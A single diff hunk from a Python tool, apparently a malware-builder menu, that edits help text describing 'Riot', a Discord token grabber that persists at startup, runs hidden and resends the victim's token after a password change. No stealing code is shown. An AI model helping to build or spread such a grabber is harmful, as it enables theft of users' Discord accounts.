@@ -381,7 +381,7 @@ def main(mode: str = None, launch_tutorial: bool = False, script: str = None):
 
 
         else: 
-            Write.Input("Riot is a Discord token grabber moving to the computer startup, executing in background, and sending the new token if the victim changes his password.\n\nVisit the GitHub repo to learn more: https://github.com/billythegoat356/Riot\n\nAnyways, please be aware that the victim needs Python3 to execute this script.", Colors.purple_to_red, interval=0.005)
+            Write.Input("Riot is a Discord token grabber moving to the computer startup, executing in background, and sending the new token if the victim changes his password.\n\nVisit the GitHub repo to learn more: https://github.com/billythegoat356/Riot\n\nAnyways, please be aware that the victim needs Python to execute this script.", Colors.purple_to_red, interval=0.005)
 
             return main(mode='r')
 
